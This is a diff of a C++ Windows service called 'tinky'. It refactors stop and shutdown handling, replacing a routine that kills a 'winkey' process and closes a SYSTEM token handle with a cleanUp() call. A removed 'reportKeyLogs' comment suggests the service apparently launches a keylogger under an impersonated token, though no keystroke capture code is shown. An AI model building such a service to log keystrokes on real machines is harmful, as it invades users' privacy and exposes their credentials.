@@ -7,38 +7,11 @@ using namespace std;
 extern tinky_t tinky;
 extern processes_t processes;
 
-static void sendStatus(DWORD currentState, DWORD ctrlsAccepted) {
+void sendStatus(DWORD currentState, DWORD ctrlsAccepted) {
 	tinky.svcStatus.dwCurrentState = currentState;
 	tinky.svcStatus.dwControlsAccepted = ctrlsAccepted;
 	
 	SetServiceStatus(tinky.svcStatusHandle, &tinky.svcStatus);
-}
-
-static void stopAllProcesses(void) {
-	SetEvent(tinky.tinkyStopEventHandle);
-	SetEvent(processes.stopEventHandle);
-
-	// terminateProcesses() TODO
-	if (!TerminateProcess(processes.winkeyProcessInfo.hProcess, NONE)) {
-		journalReport(wstring(L"Terminate process failed with code: ") + itostring(GetLastError()) + wstring(L"\n"));
-	} // is it needed if the process stop by himself ?
-
-	// closeProcesses() TODO
-	if (processes.winkeyProcessInfo.hProcess)
-		CloseHandle(processes.winkeyProcessInfo.hProcess);
-
-	if (processes.winkeyProcessInfo.hThread)
-		CloseHandle(processes.winkeyProcessInfo.hThread);
-
-	if (processes.systemToken)
-		CloseHandle(processes.systemToken);
-
-	if (tinky.tinkyStopEventHandle)
-		CloseHandle(tinky.tinkyStopEventHandle);
-
-	if (processes.stopEventHandle)
-		CloseHandle(processes.stopEventHandle);
-	sendStatus(SERVICE_STOPPED, NONE);
 }
 
 /* https://learn.microsoft.com/fr-fr/windows/win32/api/winsvc/nc-winsvc-lphandler_function_ex */
@@ -47,11 +20,10 @@ DWORD WINAPI controlHandler(DWORD dwControl, DWORD, LPVOID, LPVOID) {
 		case (SERVICE_CONTROL_INTERROGATE):
 			return (NO_ERROR);
 		case (SERVICE_CONTROL_STOP):
-			stopAllProcesses();
+			cleanUp();
 			return (NO_ERROR);
 		case (SERVICE_CONTROL_SHUTDOWN):
-			//reportKeyLogs();
-			stopAllProcesses();
+			cleanUp();
 			return (NO_ERROR);
 	}
 	return (ERROR_CALL_NOT_IMPLEMENTED);
@@ -75,7 +47,8 @@ static HANDLE createEvent(const wchar_t *eventName) {
 }
 
 static BYTE initService(void) {
-	impersonate();
+	if (!impersonate())
+		return (FAILURE);
 	registerControlHandler();
 	tinky.svcStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
 	sendStatus(SERVICE_START_PENDING, NONE);
@@ -102,12 +75,11 @@ VOID WINAPI serviceMain(DWORD dwNumServicesArgs, LPWSTR *lpServiceArgVectors) {
 		while (true) {
 
 			WaitForSingleObject(tinky.tinkyStopEventHandle, INFINITE);
-			journalReport(wstring(L"Process tinky stop event\n").c_str());
+			journalReport(L"Process tinky stopped\n");
 			return ;
 
 		}
 	}
-	(void)dwNumServicesArgs, (void)lpServiceArgVectors;
 }
 
 /* SERVICE_TABLE_ENTRY = array of services (name + funcptr) */
